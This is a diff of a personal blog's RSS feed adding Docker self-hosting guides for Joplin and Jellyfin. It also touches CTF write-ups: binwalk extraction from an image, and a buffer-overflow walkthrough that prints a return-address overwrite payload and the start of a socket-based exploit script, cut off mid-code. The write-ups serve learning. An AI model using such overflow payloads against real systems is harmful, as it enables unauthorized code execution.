@@ -4,10 +4,146 @@
         <link>https://shanks.dev/posts/</link>
         <description>Recent content in Posts on Shanks&#39; Blog</description>
         <generator>Hugo -- gohugo.io</generator>
-        <language>en-us</language>
+        <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 25 May 2023 21:10:04 -0400</lastBuildDate>
+        <lastBuildDate>Tue, 01 Aug 2023 15:07:11 -0400</lastBuildDate>
         <atom:link href="https://shanks.dev/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>0x8 - Joplin Server using Docker</title>
+            <link>https://shanks.dev/posts/blog-posts/0x8/</link>
+            <pubDate>Tue, 01 Aug 2023 15:07:11 -0400</pubDate>
+            
+            <guid>https://shanks.dev/posts/blog-posts/0x8/</guid>
+            <description>I&amp;rsquo;ve recently migrated from Anytype to Joplin for my note taking and wanted to self host the cloud server. Because I currently host my website through GitHub Pages but wanted to use a subdomain to get it
+Thanks to the docker compose sample file as well as this and this video from DB Tech, I was able to setup my Joplin Server on Portainer
+Here is the official Joplin server guide</description>
+            <content type="html"><![CDATA[<p>I&rsquo;ve recently migrated from <a href="https://anytype.io/">Anytype</a> to <a href="https://joplinapp.org/">Joplin</a> for my note taking and wanted to self host the cloud server. Because I currently host my website through <a href="https://pages.github.com/">GitHub Pages</a> but wanted to use a subdomain to get it</p>
+<p>Thanks to the <a href="https://raw.githubusercontent.com/laurent22/joplin/dev/docker-compose.server.yml">docker compose sample file</a> as well as <a href="https://www.youtube.com/watch?v=9QVS9P5PPnI">this</a> and <a href="https://www.youtube.com/watch?v=Q5dG8g4-Sx0">this</a> video from <a href="https://www.youtube.com/@DBTechYT">DB Tech</a>, I was able to setup my <a href="https://github.com/laurent22/joplin/tree/dev/packages/server">Joplin Server</a> on <a href="https://www.portainer.io/">Portainer</a></p>
+<p><a href="https://github.com/laurent22/joplin/blob/dev/packages/server/README.md">Here is the official Joplin server guide</a></p>
+<p>I used the sample docker compose file mentioned earlier and modified it to my preferences. Change all fields that use a place holder name prefacing with <code>$</code>. Note that the <code>${APP_BASE_URL}</code> requires you to include <code>http</code> or <code>https</code> depending on which protocol you&rsquo;re using.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span>version: <span style="color:#e6db74">&#39;3&#39;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>services:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    db:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        image: postgres:15<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        volumes:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - ./docker/joplin/db:/var/lib/postgresql/data<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        ports:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - <span style="color:#e6db74">&#34;5432:5432&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        restart: unless-stopped<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        environment:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - POSTGRES_PASSWORD<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>POSTGRES_PASSWORD<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - POSTGRES_USER<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>POSTGRES_USER<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - POSTGRES_DB<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>POSTGRES_DATABASE<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    app:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        image: joplin/server:latest<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        depends_on:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - db<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        ports:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - <span style="color:#e6db74">&#34;22300:22300&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        restart: unless-stopped<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        environment:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - APP_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">22300</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - APP_BASE_URL<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>APP_BASE_URL<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - DB_CLIENT<span style="color:#f92672">=</span>pg<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - POSTGRES_PASSWORD<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>POSTGRES_PASSWORD<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - POSTGRES_DATABASE<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>POSTGRES_DATABASE<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - POSTGRES_USER<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>POSTGRES_USER<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - POSTGRES_PORT<span style="color:#f92672">=</span><span style="color:#ae81ff">5432</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>            - POSTGRES_HOST<span style="color:#f92672">=</span>db<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Instead of using a reverse proxy, I used <a href="https://www.cloudflare.com/plans/zero-trust-services/">Cloudflare&rsquo;s Zero Trust</a> tunneling access to make it easier. Create an account and add your payment info after selecting the free plan.</p>
+<ol>
+<li>Log into your domain registrar</li>
+<li>Remove current nameservers</li>
+<li>Add Cloudflare&rsquo;s provided nameservers</li>
+<li>Go to Cloudflare Zero Trust dashboard</li>
+<li>Click Access, then tunnels</li>
+<li>Create a tunnel</li>
+<li>Give it a name</li>
+<li>Install a connector, click on Docker</li>
+<li>Copy the given command that looks like this:</li>
+</ol>
+<ul>
+<li>Note that I added the <code>-d</code> flag so that it runs in the background of your terminal</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -d cloudflare/cloudflared:latest tunnel --no-autoupdate run --token $token
+</span></span></code></pre></div><ol start="10">
+<li>Fill in the fields for the public hostname for your chosen domain
+<ol>
+<li>For the URL, write the internal IP with the port, for example: <code>http://192.168.0.101:22300</code></li>
+</ol>
+</li>
+</ol>
+<p>Once the tunnel is successfully created, you should be able to access your Joplin instance from the internet!</p>
+<h2 id="configuring-admin-page">Configuring Admin Page</h2>
+<p>Following the <a href="https://github.com/laurent22/joplin/blob/dev/packages/server/README.md">official guide</a> we access our instance and login using the given credentials:</p>
+<pre tabindex="0"><code>username: admin@localhost
+password: admin
+</code></pre><p>Now that you&rsquo;ve logged in, go and change the credentials to something genuinely secure. If you&rsquo;re like me and did not configure the email setup, when you get the confirmation email you can actually see the email by going into the <code>Admin</code> panel and selecting <code>Emails</code> where you will see the email. From here you can retrieve the verificaiton link.</p>
+<p>Now we follow the instructions written on the Joplin home page of our login to setup our connection to the server. The only thing to mention is that the self hosting option is a bit hidden in smaller print when you&rsquo;re selecting the <code>Synchronize</code> button. Make sure to select that option and not the Joplin Cloud/Dropbox/OneDrive options.</p>
+<p>Now you&rsquo;re setup! I would suggest to checkout the <a href="https://joplinapp.org/e2ee/">End-to-End Encryption</a> docs for enabling E2EE. It is a great way to improve your note security. Just note that if you plan to share a notebook with E2EE enabled (for both you and your partner), you will need your partners decryption key and you will need to share your encryption key.</p>
+<h4 id="issues-that-i-encountered">Issues that I encountered</h4>
+<p>With the the containers for the database and the app running just fine, I had the following error from the database container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2023-08-01 06:58:21.839 UTC <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> LOG:  database system is ready to accept connections
+</span></span><span style="display:flex;"><span>2023-08-01 06:58:22.617 UTC <span style="color:#f92672">[</span>70<span style="color:#f92672">]</span> ERROR:  relation <span style="color:#e6db74">&#34;knex_migrations&#34;</span> does not exist at character <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>2023-08-01 06:58:22.617 UTC <span style="color:#f92672">[</span>70<span style="color:#f92672">]</span> STATEMENT:  <span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;name&#34;</span> from <span style="color:#e6db74">&#34;knex_migrations&#34;</span> order by <span style="color:#e6db74">&#34;id&#34;</span> desc limit $1
+</span></span></code></pre></div><p>From there the app returns the following error:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2023-08-01 07:01:21: <span style="color:#f92672">[</span>error<span style="color:#f92672">]</span> App: 404: GET /: ::ffff:192.168.0.108: Invalid origin: http://192.168.0.102:22300
+</span></span><span style="display:flex;"><span>2023-08-01 07:01:21: App: GET / <span style="color:#f92672">(</span>404<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>5ms<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>After speaking with some friends and reaching out to the community, I realized that the cause for this was when I set the scheme to <code>HTTPS</code> instead of <code>HTTP</code> in my Cloudflare tunnel. Once I changed that setting I was able to access the Joplin server.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>0x9 - Jellyfin Server using Docker</title>
+            <link>https://shanks.dev/posts/blog-posts/0x9/</link>
+            <pubDate>Tue, 25 Jul 2023 15:07:15 -0400</pubDate>
+            
+            <guid>https://shanks.dev/posts/blog-posts/0x9/</guid>
+            <description>I decided I wanted to host my own media server and I didn&amp;rsquo;t want to use Plex so I chose Jellyfin. Here&amp;rsquo;s how I set mine up using docker and Portainer.
+Docker You can use docker compose or simply deploy the app through Portainer&amp;rsquo;s UI without docker compose. Replace any $ variable with your setting. Here are the settings that I used for my docker setup:
+image: linuxserver/jellyfin:latest ports: - 1900:1900 # tcp - 8086:8086 # tcp - 7359:7359 # udp volumes: - .</description>
+            <content type="html"><![CDATA[<p>I decided I wanted to host my own media server and I didn&rsquo;t want to use Plex so I chose Jellyfin. Here&rsquo;s how I set mine up using docker and <a href="https://www.portainer.io/">Portainer</a>.</p>
+<h2 id="docker">Docker</h2>
+<p>You can use docker compose or simply deploy the app through Portainer&rsquo;s UI without  docker compose. Replace any <code>$</code> variable with your setting. Here are the settings that I used for my docker setup:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span>image: linuxserver/jellyfin:latest<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>ports:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- 1900:1900 <span style="color:#75715e"># tcp</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- 8086:8086 <span style="color:#75715e"># tcp</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- 7359:7359 <span style="color:#75715e"># udp</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>volumes:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- ./media/tv:/data/TV<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- ./media/videos:/data/Videos<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- ./media/movies:/data/movies<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- ./media/music:/data/music<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- ./docker/jellyfin/config:/config<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">env</span>ironment:<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- PUID<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>PUID<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- PGID<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>PGID<span style="color:#e6db74">}</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	- TZ<span style="color:#f92672">=</span>America/Toronto<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>	<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>restart-policy<span style="color:#f92672">=</span>unless-stopped<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>I do plan to look at using reverse proxies in the future so I may access my content from outside of my local network but that will be done at a later date. When I get it running I will update this blog post and mark it with an update timestamp.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>0x6 - Graduation from University</title>
+            <link>https://shanks.dev/posts/blog-posts/0x6/</link>
+            <pubDate>Fri, 23 Jun 2023 16:27:39 -0400</pubDate>
+            
+            <guid>https://shanks.dev/posts/blog-posts/0x6/</guid>
+            <description>A few days ago I had my convocation. I finally completed my biggest academic struggle &amp;amp; achievement yet, graduating university with a Bachelor&amp;rsquo;s Degree in Computer Science. Having taken courses in nearly every semester during my time at university with the exception of my first summer semester, I am very proud to have achieved such a feat.
+Regardless of how I felt about the education itself, the friends and networks that I created was certainly the most valuable part of the journey.</description>
+            <content type="html"><![CDATA[<p>A few days ago I had my convocation. I finally completed my biggest academic struggle &amp; achievement yet, graduating university with a Bachelor&rsquo;s Degree in Computer Science. Having taken courses in nearly every semester during my time at university with the exception of my first summer semester, I am very proud to have achieved such a feat.</p>
+<p>Regardless of how I felt about the education itself, the friends and networks that I created was certainly the most valuable part of the journey. The openess of the students and the community created out of a shared struggle to succeed played a huge role in helping me to learn and understand abstract and difficult material, no matter how it was presented.</p>
+<p>A huge thank you to the support network that kept me going for those 4 long years. My girlfriend was my pillar to lean on, my friends were my teacher when I could not understand, my family was my cheerleaders. I certainly could not have gotten through this without all of you.</p>
+<p>I hope that someday I can return the same level of support that you guys have done and continue to do for me.</p>
+]]></content>
+        </item>
         
         <item>
             <title>North Sec 2023 - Look Within Myself</title>
@@ -25,11 +161,11 @@ $ binwalk --dd=&amp;#39;.*&amp;#39; myself-avatar.jpg We now have the following 
 <p>Based on the information given, we have to tinker with the image posted:</p>
 <p><img src="../src/myself-avatar.jpg" alt="myself-avatar"></p>
 <p>Let&rsquo;s first check if there are embedded files within the image using the following command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ binwalk myself-avatar.jpg
-</code></pre></div><p><img src="../imgs/binwalk.png" alt="binwalk"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ binwalk myself-avatar.jpg
+</span></span></code></pre></div><p><img src="../imgs/binwalk.png" alt="binwalk"></p>
 <p>Okay so there&rsquo;s a zip file hidden, let&rsquo;s extract it using the following command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ binwalk --dd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;.*&#39;</span> myself-avatar.jpg
-</code></pre></div><p><img src="../imgs/extract.png" alt="extract"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ binwalk --dd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;.*&#39;</span> myself-avatar.jpg
+</span></span></code></pre></div><p><img src="../imgs/extract.png" alt="extract"></p>
 <p>We now have the following <a href="../src/302D9.7z">zip</a> file, it is password protected. From here we could attempt to brute force it with a tool but I was lucky and guessed the correct password to be <code>password</code>.</p>
 <p>Inside the folder called <code>myself</code> we see a bunch of cat images and an interesting file called <code>myself.txt</code></p>
 <p><img src="../imgs/folder.png" alt="folder"></p>
@@ -65,11 +201,11 @@ $ binwalk --dd=&amp;#39;.*&amp;#39; myself-avatar.jpg We now have the following 
 <p>The talks ended Friday evening around 17:00 and the CTF started at 20:00. I had the priviledge and pleasure to join <a href="https://cubermitis.team/">cubermitis</a>, a group of highly motivated and skilled CTF-erss for this event. We started off quite strong, holding within the top 10 position for the first 24 hours:</p>
 <p><img src="../imgs/nsec2023-winning.png" alt="winning"></p>
 <p>By the end of the event, we managed to secure 18th place on the leaderboard with 98 points, out of 76 total teams.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; askgod scoreboard                                  
+<pre tabindex="0"><code>&gt; askgod scoreboard                                  
         TEAM       | POINTS |   LAST SUBMIT     
 -------------------+--------+-------------------
-  &lt;CA&gt; Cubermitis  |     <span style="color:#ae81ff">98</span> | 2023/05/21 14:57 
-</code></pre></div><p><img src="../imgs/nsec2023-final.png" alt="scoreboard"></p>
+  &lt;CA&gt; Cubermitis  |     98 | 2023/05/21 14:57 
+</code></pre><p><img src="../imgs/nsec2023-final.png" alt="scoreboard"></p>
 <p>Overall, despite being quite new to the CTF scene and finding difficulty with many of the higher level challenges this year, I was proud that I managed to get a few challenges solved while helping out my teammates. The experience I got from the CTF was invaluable and well worth while, I learned a ton while having a great time. I will definitely attend following North Sec events.</p>
 ]]></content>
         </item>
@@ -104,71 +240,71 @@ Solution I would like to preface this, that I have done this exact challenge fro
 <p>Now on to how I retrieved the flag!</p>
 <p>First we look at the <a href="../src/chall.c">chall.c</a> file and notice immediately the <code>gets</code> function. A known vulnerable C function that is susceptible to buffer overflows. Furthermore, there’s an uncalled <code>win</code> function which will print out the flag. Now we want to overflow the <code>gets</code> function such that we can retrieve the flag through the uncalled <code>win</code> function.</p>
 <p>How do we overflow the <code>gets</code> function? Well you need to pass in enough input until you can begin to control where you end up in memory. But we will need to know where in memory we want to go. How is this done? Using <code>readelf</code> I could find out where in memory the <code>win</code> function was loaded. Note that the <code>-s</code> is for symbols.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">readelf -s chall
-</code></pre></div><p>We see on our test machine that the win function is located in the following address: <code>0x08048486</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>readelf -s chall
+</span></span></code></pre></div><p>We see on our test machine that the win function is located in the following address: <code>0x08048486</code></p>
 <p>Now we just need to pass in enough values until we can manipulate the memory address. I achived this by passing in an obnoxious amount of <code>A</code>’s to the program until I got a seg fault. I did this in chunks of 4 A’s at a time. Eventually I realized that adding 12 characters to the input string originally made to be size of 56 caused a segfault.</p>
 <p>Checking with</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo dmesg
-</code></pre></div><p>We can see where the instruction pointer (<code>ip</code>) is pointing when it seg faults. Let’s add 1 more character to the string, like <code>A</code> we see where we end up with the tool. Using dmesg we see that theres a seg fault at an address ending in <code>0x41</code>, which should look familiar as <code>0x41</code> is the hex value of <code>A</code>. Testing it with <code>B</code> we see it ending with <code>0x42</code>. Now we know we can manipulate the memory to get to the <code>win</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dmesg
+</span></span></code></pre></div><p>We can see where the instruction pointer (<code>ip</code>) is pointing when it seg faults. Let’s add 1 more character to the string, like <code>A</code> we see where we end up with the tool. Using dmesg we see that theres a seg fault at an address ending in <code>0x41</code>, which should look familiar as <code>0x41</code> is the hex value of <code>A</code>. Testing it with <code>B</code> we see it ending with <code>0x42</code>. Now we know we can manipulate the memory to get to the <code>win</code> function.</p>
 <p>Since we want to end up in <code>0x08048486</code>, we will have to understand how memory works a little more. The concept of <a href="https://en.wikipedia.org/wiki/Endianness">Endianness</a> is important here. <a href="https://youtu.be/k4hqdVo3cqk?t=1347">John does a great explanation about it here</a>. But to summarize, essentially we need to take chunks of bytes (pairs of 2 in this case) and ‘invert’ it so to speak. These bytes are stored in memory using Little Endian encoding. Take a look below:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">We want to change this address into Little Endian:
-0x08048486
-
-Grab the first 2 &#39;characters&#39; and put them at the end, then grab the next 2 &#39;characters&#39; and put them in the second to last place, and so on:
-0x86840408
-
-Here is how we will represent the bytes in Python:
-\x86\x84\x04\x08
-</code></pre></div><p>We check the conversion to bytes using the following command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | xxd
-</code></pre></div><p>Testing with the local function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | ./chall
-</code></pre></div><p><img src="../imgs/overflow.png" alt="overflow"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>We want to change this address into Little Endian:
+</span></span><span style="display:flex;"><span>0x08048486
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Grab the first 2 &#39;characters&#39; and put them at the end, then grab the next 2 &#39;characters&#39; and put them in the second to last place, and so on:
+</span></span><span style="display:flex;"><span>0x86840408
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Here is how we will represent the bytes in Python:
+</span></span><span style="display:flex;"><span>\x86\x84\x04\x08
+</span></span></code></pre></div><p>We check the conversion to bytes using the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | xxd
+</span></span></code></pre></div><p>Testing with the local function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | ./chall
+</span></span></code></pre></div><p><img src="../imgs/overflow.png" alt="overflow"></p>
 <p>Lets write up a quick Python script, <a href="../src/bin-exploit.py">here is the direct download</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
-
-<span style="color:#f92672">import</span> socket <span style="color:#75715e"># dealing with internet connections</span>
-<span style="color:#f92672">import</span> argparse <span style="color:#75715e"># pass arguments when calling the script so we can use it for any other CTF challenges</span>
-<span style="color:#f92672">import</span> struct <span style="color:#75715e"># for changing the memory address into Little Endian.</span>
-
-<span style="color:#75715e"># Build out the arg parser and args to take in</span>
-parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
-parser<span style="color:#f92672">.</span>add_argument(
-    <span style="color:#e6db74">&#34;host&#34;</span>,
-    type<span style="color:#f92672">=</span>str,
-    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The hostname or IP address to connect to&#34;</span>
-)
-parser<span style="color:#f92672">.</span>add_argument(
-    <span style="color:#e6db74">&#34;port&#34;</span>,
-    type<span style="color:#f92672">=</span>int,
-    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The port for the service to connect to&#34;</span>
-)
-
-args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
-
-<span style="color:#75715e"># for testing</span>
-print(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
-
-<span style="color:#75715e"># Swaps the memory address to Little Endian for us</span>
-ip <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0x08048486</span>)
-
-<span style="color:#75715e"># 69 here represents the offset + 1</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(
-    [
